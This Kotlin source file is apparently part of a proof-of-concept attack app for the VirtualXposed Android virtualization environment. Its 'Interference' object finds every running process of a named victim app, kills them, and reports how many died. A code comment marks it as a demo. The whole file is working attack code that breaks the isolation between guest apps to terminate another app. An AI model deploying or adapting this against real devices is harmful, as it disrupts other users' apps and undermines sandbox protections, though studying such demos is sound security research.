package com.virtualxposed.guestattacker

import android.app.ActivityManager
import android.content.Context
import android.content.Context.ACTIVITY_SERVICE
import com.virtualxposed.guestattacker.StorageBypass.VICTIM_APP
import com.virtualxposed.guestattacker.Utils.log
import com.virtualxposed.guestattacker.Utils.toast
import kotlinx.coroutines.delay
import kotlin.time.Duration.Companion.milliseconds

object Interference {
    suspend fun killVictim(context: Context) {
        val activityManager =
            context.getSystemService(ACTIVITY_SERVICE) as ActivityManager
        val victimProcesses =
            activityManager.runningAppProcesses.filter { it.processName == VICTIM_APP }

        if (victimProcesses.isEmpty()) {
            toast(context, "No victim process")
            return
        }

        victimProcesses.forEach { targetProcess ->
            log("Killing process ${targetProcess.pid}")
            android.os.Process.killProcess(targetProcess.pid)
        }

        // killProcess is not blocking, this is good enough for a demo
        delay(100.milliseconds)

        val newVictimProcesses =
            activityManager.runningAppProcesses.filter { it.processName == VICTIM_APP }

        if (newVictimProcesses.size < victimProcesses.size) {
            val difference = victimProcesses.size - newVictimProcesses.size
            toast(
                context,
                "Killed $difference/${victimProcesses.size} victim processes"
            )
        } else {
            toast(context, "Failed to kill the victim process")
        }
    }
}